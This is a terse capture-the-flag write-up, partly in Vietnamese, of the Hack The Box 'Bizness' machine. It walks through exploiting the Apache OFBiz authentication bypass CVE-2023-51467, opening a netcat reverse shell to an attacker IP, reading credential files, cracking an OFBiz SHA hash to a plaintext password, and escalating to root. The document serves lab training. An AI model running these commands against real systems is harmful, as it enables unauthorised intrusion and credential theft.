# bizness

- enumerate

tìm thấy p22, 80 và 443

![https://lh7-us.googleusercontent.com/HLG78cE3URTYiZrNSDZ8vfVoJZbydsRrXDQDhJoTANkLUYjYMkkCboT6b2MyScDDLMKhRr7SosagzT5TJCzi67dJ4rY_8Sgj-Z8wLZKhApC7dleDO244hkRxQYO9lfa1z7G48x339s1-](https://lh7-us.googleusercontent.com/HLG78cE3URTYiZrNSDZ8vfVoJZbydsRrXDQDhJoTANkLUYjYMkkCboT6b2MyScDDLMKhRr7SosagzT5TJCzi67dJ4rY_8Sgj-Z8wLZKhApC7dleDO244hkRxQYO9lfa1z7G48x339s1-)

add /etc/hosts

ko  tìm thấy subdomain

![https://lh7-us.googleusercontent.com/0_oCphj8x3axP9xVGoy29o4CZ13DEy12o8Fa942d29rfFNwVtPxHKkMIivrqigA0FlkHDpjjv9H2Uq5Dtz-R86yhel6HS9EW4rZch_NlmpZWmM6AnLUSBbpU0ftRDTJFgWUSUh1LXB3q](https://lh7-us.googleusercontent.com/0_oCphj8x3axP9xVGoy29o4CZ13DEy12o8Fa942d29rfFNwVtPxHKkMIivrqigA0FlkHDpjjv9H2Uq5Dtz-R86yhel6HS9EW4rZch_NlmpZWmM6AnLUSBbpU0ftRDTJFgWUSUh1LXB3q)

tìm thấy các path ẩn

![https://lh7-us.googleusercontent.com/eQodtclUSEw6rYOKUKW7MS8K5XyRgHlMLyADj2BAdVcFfeJnUizVQOus94UeAqQY41syS-YPDAKd_HKL-_wr4PmN3Vx6V2z2hieZWazx1jZgF-iyZOV0WhOzNZN3DsJNfJ6hZH6mtsrw](https://lh7-us.googleusercontent.com/eQodtclUSEw6rYOKUKW7MS8K5XyRgHlMLyADj2BAdVcFfeJnUizVQOus94UeAqQY41syS-YPDAKd_HKL-_wr4PmN3Vx6V2z2hieZWazx1jZgF-iyZOV0WhOzNZN3DsJNfJ6hZH6mtsrw)

![https://lh7-us.googleusercontent.com/g-krgQh0dr-toekWBniDTK-v2wnsKGWSXFIO39jQWdl9hDdUlmDd1qSLYbmbC5VMEFrBKzz2ss8Ylr47_BoVdchh02ZS0rqp4jlUzEvo_woY4jDT_0FTPQYJY5XI19UzNawxxv8Z-sp1](https://lh7-us.googleusercontent.com/g-krgQh0dr-toekWBniDTK-v2wnsKGWSXFIO39jQWdl9hDdUlmDd1qSLYbmbC5VMEFrBKzz2ss8Ylr47_BoVdchh02ZS0rqp4jlUzEvo_woY4jDT_0FTPQYJY5XI19UzNawxxv8Z-sp1)

thử truy cập /ebay -> yêu cầu login

![https://lh7-us.googleusercontent.com/2mGWsxqWcJSXtH8FKcB5QNr_lNdwgD0iSDQKxpcnwumgyrOSsY04jVMx1EbUK8elfl2Hv3Gwlj71EH_lnIt920Amtj3dp4pA-5bJhHys5Rtj1ARIpBtuvy6ibh5ZYA8Szhv7b5kKwIO9](https://lh7-us.googleusercontent.com/2mGWsxqWcJSXtH8FKcB5QNr_lNdwgD0iSDQKxpcnwumgyrOSsY04jVMx1EbUK8elfl2Hv3Gwlj71EH_lnIt920Amtj3dp4pA-5bJhHys5Rtj1ARIpBtuvy6ibh5ZYA8Szhv7b5kKwIO9)

search ofbiz 18.12 exploit

CVE-2023–51467. It states, “The vulnerability permits attackers to circumvent authentication processes, enabling them to remotely execute arbitrary code”

[https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass)

python3 exploit.py - url https://bizness.htb/ - cmd 'nc -e /bin/bash 10.10.14.15 4444'

netcat -> user ofbiz

![https://lh7-us.googleusercontent.com/YDowU5CAkeh4AMxY7bwIkGQx2Dl07EnKNNLuJRI6JwWgAI5e3zQ-hj3-zJx453obsK-u_jHl-REaXZWEf4ObcUb2PQ_C3fjggdl5PD76yuhbFPs5l92akPsfdMp2xxc5L_4E6fraflSZ](https://lh7-us.googleusercontent.com/YDowU5CAkeh4AMxY7bwIkGQx2Dl07EnKNNLuJRI6JwWgAI5e3zQ-hj3-zJx453obsK-u_jHl-REaXZWEf4ObcUb2PQ_C3fjggdl5PD76yuhbFPs5l92akPsfdMp2xxc5L_4E6fraflSZ)

upgrade shell

script /dev/null -qc /bin/bash

stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

tìm thấy pw trong AdminUserLoginData.xml

cat /opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml

{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a nhưng ko crack đc

và

cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat

$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I

sử dụng tool để crack [duck-sec/Apache-OFBiz-SHA1-Cracker: Cracks Apache OFBiz SHA1 hashes. Just something you might want to do.... (github.com)](https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker?source=post_page-----b5bed59a7598--------------------------------)

python3 OFBiz-crack.py --hash-string '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I' --wordlist /home/kali/Documents/wordlist/ry.txt

monkeybizness

lên root bằng lệnh su

lấy flag root

![https://lh7-us.googleusercontent.com/ch29ONMmI9kj3IoZEdoWW0O7tweMD-_QZqRk6YuSweXUHiy3v3f4aVNLLy3vQKBALvmwYKOAMxsVhTMRSbHWFwWFEwT8my_x_tdaaqUPSnaYowqJyqkZZCnwU9vyRWQbyAzbs1pLWRqq](https://lh7-us.googleusercontent.com/ch29ONMmI9kj3IoZEdoWW0O7tweMD-_QZqRk6YuSweXUHiy3v3f4aVNLLy3vQKBALvmwYKOAMxsVhTMRSbHWFwWFEwT8my_x_tdaaqUPSnaYowqJyqkZZCnwU9vyRWQbyAzbs1pLWRqq)